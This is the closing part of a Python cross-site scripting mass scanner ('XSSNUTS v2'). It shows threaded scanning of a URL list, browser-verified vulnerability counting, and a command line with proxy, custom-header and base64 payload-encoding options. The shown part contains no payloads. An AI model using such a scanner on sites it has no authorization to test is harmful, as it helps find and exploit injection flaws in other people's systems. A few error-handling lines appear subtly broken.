                rendered = re.sub(r"NOT VULN \[\d+\]", lambda m: "\033[91m" + m[0] + "\033[0m", rendered)
                rendered = re.sub(r"(?<!NOT )VULN \[\d+\]", lambda m: "\033[92m" + m[0] + "\033[0m", rendered)
                rendered = re.sub(r"ERROR \[\d+\]", lambda m: "\033[93m" + m[0] + "\033[0m", rendered)
                rendered = re.sub(r"\[[#-]+\]", lambda m: "\033[96m" + m[0] + "\033[0m", rendered)
            _bar.write("\r" + rendered + " " * max(0, min(previous_width, width) - len(plain)))
            previous_width = len(plain)
            if final:
                _bar.write("\n")
            _bar.flush()

    def animate():
        while not stop_display.wait(0.15):
            print_status()

    save_results()
    print_status()
    animation = threading.Thread(target=animate, daemon=True)
    animation.start()
    try:
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = {executor.submit(scan_with_delay, u): u for u in urls}
            for future in as_completed(futures):
                completed += 1
                try:
                    r = future.result()
                except Exception as exc:
                    error_count += 1
                    r = {"url": futures[future], "vulnerable": False, "error": str(exc)}
                results.append(r)
                if r.get("vulnerable") and any(
                    isinstance(f, dict) and f.get("verification") == "browser-execution"
                    for f in r.get("findings", [])
                ):
                    vuln_count += 1
                    vuln_results.append(public_result(r))
                save_results()
                print_status()
    finally:
        stop_display.set()
        animation.join()
        print_status(final=True)
    return results

# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    import argparse
    import os

    # Enable ANSI colors on Windows 10+
    if sys.platform == "win32":
        os.system("")

    _banner = [
        '\x1b[0;37m                                \x1b[0;97m▄\x1b[0;37m              \x1b[0m',
        '\x1b[0;37m  \x1b[0;94m▄\x1b[0;94;44m▀\x1b[0;97;44m▀▀\x1b[0;97m▄\x1b[0;37m  \x1b[0;94m▄\x1b[0;97;44m▀▀\x1b[0;97m▄\x1b[0;37m \x1b[0;94m▄\x1b[0;97m▄\x1b[0;37m     \x1b[0;94m▄\x1b[0;94;44m▀▀▀\x1b[0;97;44m▀▀\x1b[0;97m▄\x1b[0;37m  \x1b[0;94m▄\x1b[0;94;44m▀\x1b[0;34m█\x1b[0;97;44m▀▀▀\x1b[0;97m▄\x1b[0;37m   \x1b[0;94m▄\x1b[0;94;44m▀\x1b[0;97;44m▀▀\x1b[0;97m▄\x1b[0;37m  \x1b[0m',
        '\x1b[0;94m▄\x1b[0;94;44m▀\x1b[0;34m██\x1b[0;94;44m▄▄\x1b[0;34m█\x1b[0;97;44m▀\x1b[0;97m▄\x1b[0;94m▐\x1b[0;94;44m▌\x1b[0;34m█\x1b[0;97;44m▐\x1b[0;97m▌\x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;97;44m▀\x1b[0;97m▄\x1b[0;37m  \x1b[0;94;44m█\x1b[0;34m█\x1b[0;97;44m▄\x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;34m█\x1b[0;97;44m▌\x1b[0;34m█\x1b[0;97m▌\x1b[0;94m█\x1b[0;94;44m▄▄\x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;34m█\x1b[0;34;44m█\x1b[0;97;44m▐\x1b[0;97m▌\x1b[0;94m▄\x1b[0;94;44m▀\x1b[0;34m██\x1b[0;94;44m▄\x1b[0;34m██\x1b[0;97;44m▀\x1b[0;97m▄\x1b[0m',
        '\x1b[0;94;44m█\x1b[0;34m██\x1b[0;97m█\x1b[0;34m▄\x1b[0;94m▐\x1b[0;94;44m▌\x1b[0;34m█\x1b[0;97m█\x1b[0;37m \x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;34m█\x1b[0;97;44m▀\x1b[0;97m▄\x1b[0;94m▐\x1b[0;94;44m▌\x1b[0;97;44m▐\x1b[0;97m▌\x1b[0;37m \x1b[0;94m▀▀▄\x1b[0;97;44m▀▀\x1b[0;34m█\x1b[0;97;44m▐\x1b[0;97m▀\x1b[0;37m  \x1b[0;94m▄▄\x1b[0;94;44m▀\x1b[0;34;44m▄\x1b[0;34m█\x1b[0;97;44m▄\x1b[0;97m▀\x1b[0;37m \x1b[0;94;44m█\x1b[0;34m██\x1b[0;97m█\x1b[0;37m \x1b[0;94;44m█\x1b[0;34m██\x1b[0;97m█\x1b[0m',
        '\x1b[0;94;44m█\x1b[0;34m█\x1b[0;97;44m▐\x1b[0;97m▌\x1b[0;37m \x1b[0;94;44m█\x1b[0;34m██\x1b[0;97m█\x1b[0;94m▄\x1b[0;94;44m▀\x1b[0;34m██\x1b[0;94;44m▄\x1b[0;34m██\x1b[0;97;44m▄\x1b[0;97m▀\x1b[0;37m  \x1b[0;94m▄\x1b[0;94;44m▀\x1b[0;97m▄\x1b[0;94m▀\x1b[0;94;44m█\x1b[0;34m█\x1b[0;97;44m▐\x1b[0;37m  \x1b[0;94m█\x1b[0;34m██\x1b[0;94;44m▄\x1b[0;97m▀▀▄\x1b[0;37m  \x1b[0;94;44m█\x1b[0;34m██\x1b[0;97m█\x1b[0;37m \x1b[0;94;44m█\x1b[0;34m██\x1b[0;97m█\x1b[0m',
        '\x1b[0;37m \x1b[0;94m▀\x1b[0;94;44m▄▀\x1b[0;97;44m▀\x1b[0;34m█\x1b[0;97;44m▄\x1b[0;97m▀\x1b[0;37m \x1b[0;94m█\x1b[0;34m██\x1b[0;97m█\x1b[0;37m \x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;34m█\x1b[0;97;44m▀▀\x1b[0;97m▄\x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;34m█\x1b[0;97;44m▀▀\x1b[0;34m██\x1b[0;97;44m▀\x1b[0;97m▄\x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;34m█\x1b[0;97;44m▀▀▀\x1b[0;34m█\x1b[0;97;44m▀\x1b[0;97m▄\x1b[0;37m \x1b[0;94m▀\x1b[0;94;44m▄\x1b[0;34m█\x1b[0;97;44m▀\x1b[0;34m█\x1b[0;97;44m▄\x1b[0;97m▀\x1b[0;37m \x1b[0m',
        '\x1b[0;37m   \x1b[0;94m▀\x1b[0;97m▀▀\x1b[0;37m    \x1b[0;94m▀\x1b[0;97m▀\x1b[0;37m    \x1b[0;94m▀\x1b[0;97m▀▀\x1b[0;37m   \x1b[0;94m▀▀▀▀\x1b[0;97m▀▀\x1b[0;37m   \x1b[0;97m▀▀▀▀▀▀\x1b[0;37m    \x1b[0;94m▀\x1b[0;97m▀▀\x1b[0;37m   \x1b[0m',
    ]
    for line in _banner:
        print(line)
    print()
    print("    \033[1;37mXSSNUTS v2\033[0m    |    \033[33mTwitter: @0x3zoo\033[0m    |    \033[34mGitHub: @0x3zo\033[0m")
    print()

    parser = argparse.ArgumentParser(description="\033[1;36mXSS Mass Scanner\033[0m")
    parser.add_argument("input",      help="\033[33mFile with URLs (one per line)\033[0m")
    parser.add_argument("-o", "--output", default="results.json", help="\033[33mOutput JSON file\033[0m")
    parser.add_argument("-c", "--concurrency", type=int, default=MAX_WORKERS,
                        help=f"\033[33mThread count (default: {MAX_WORKERS})\033[0m")
    parser.add_argument("-t", "--timeout",    type=int, default=TIMEOUT,
                        help=f"\033[33mRequest timeout in seconds (default: {TIMEOUT})\033[0m")
    parser.add_argument("-d", "--delay",      type=float, default=DEFAULT_DELAY,
                        help=f"\033[33mDelay between requests to same host (default: {DEFAULT_DELAY}s)\033[0m")
    parser.add_argument("--skip-dom",         action="store_true",
                        help="\033[33mSkip DOM XSS check (faster)\033[0m")
    parser.add_argument("--skip-prompt",      action="store_true", default=True,
                        help="\033[33mSkip interactive prompts (default: on)\033[0m")
    parser.add_argument("--encode",           choices=["base64"],
                        help="\033[33mEncode payloads (e.g. base64)\033[0m")
    parser.add_argument("--proxy",            action="store_true",
                        help="\033[33mUse proxy from config\033[0m")
    parser.add_argument("--headers",          help="\033[33mCustom headers (raw text, one per line)\033[0m")
    parser.add_argument("--max-payloads",     type=int, default=5,
                        help="\033[33mDistinct payloads per URL, reused per parameter (default: 5, 0=all 10)\033[0m")
    args = parser.parse_args()
    if args.max_payloads < 0:
        parser.error("--max-payloads must be non-negative")

    print(f"    {white}BROWSER VERIFIED{end}  {green}LIVE SAVE{end}  {yellow}{args.concurrency} WORKERS{end}")
    print(f"    {white}Results:{end} {os.path.abspath(args.output)}")
    print(f"    {white}{'-' * 64}{end}\n")

    # Build headers
    headers = dict(HEADERS)
    if args.proxy:
        PROXIES.clear()
        from core.config import proxies as cfg_proxies
        PROXIES.update(cfg_proxies)
    if args.headers:
        headers.update(extract_headers(args.headers))

    encoding = None
    if args.encode == "base64":
        import base64 as b64
        encoding = lambda s: b64.b64encode(s.encode()).decode()

    mass_scan(
        url_file=args.input,
        headers=headers,
        concurrency=args.concurrency,
        delay=args.delay,
        timeout=args.timeout,
        skip_dom=args.skip_dom,
        skip_prompt=args.skip_prompt,
        encoding=encoding,
        output_file=args.output,
        max_payloads=args.max_payloads,
    )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\\nScan interrupted. Completed findings remain saved.", file=sys.stderr)
        sys.exit(130)
    except Exception as exc:
        import traceback
        log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xssnuts-error.log")
        try:
            with open(log_path, "a", encoding="utf-8") as log:
                log.write(time.strftime("\\n%Y-%m-%d %H:%M:%S\\n"))
                traceback.print_exc(file=log)
        except OSError:
            traceback.print_exc()
        else:
            print(f"\\nERROR: {exc}\\nDetails: {log_path}", file=sys.stderr)
        sys.exit(1)

